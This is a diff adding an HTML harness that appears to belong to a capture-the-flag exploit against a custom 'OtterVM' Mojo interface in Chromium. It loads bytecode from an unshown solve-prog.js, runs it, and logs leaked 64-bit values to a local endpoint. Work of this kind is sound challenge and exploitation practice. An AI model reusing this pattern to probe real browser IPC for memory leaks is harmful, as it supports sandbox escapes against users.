@@ -1,0 +1,52 @@
+<script src="/mojojs/mojo_bindings.js"></script>
+<script src="/mojojs/gen/third_party/blink/public/mojom/otter/otter_vm.mojom.js"></script>
+
+<script src="/solve-prog.js"></script>
+
+<script>
+  const log = msg => {
+    fetch("/log?log=" + encodeURIComponent(msg));
+  }
+  const sleep = ms => new Promise(res => setTimeout(res, ms));
+  window.onerror = e => log(e);
+
+  (async () => {
+    try{
+      log("starting " + Math.random());
+
+      const ptr = new blink.mojom.OtterVMPtr();
+      Mojo.bindInterface(blink.mojom.OtterVM.name, mojo.makeRequest(ptr).handle);
+      // pwn here
+
+      await sleep(100)
+
+
+      let data = new Uint8Array(code.length);
+      for (let i = 0; i < code.length; i++) data[i] = code.charCodeAt(i);
+
+      await ptr.init(data, entrypoint)
+
+      data = new Uint8Array(0x100);
+      var resp = (await ptr.run(data)).resp;
+      log("HELLO")
+
+        tmp = new Uint8Array(resp.length);
+        for (let i = 0; i < resp.length; i++) tmp[i] = resp[i]
+
+        resp = tmp
+
+        resp = new BigUint64Array(resp.buffer);
+
+  for (let i = 0; i < resp.length; i++) {
+    if (resp[i] !== 0n) {
+    log(i + ". " + resp[i].toString(16));
+    }
+  }
+
+
+    }catch(e){
+      log("error");
+      log(": " + e.stack);
+    }
+  })();
+</script>
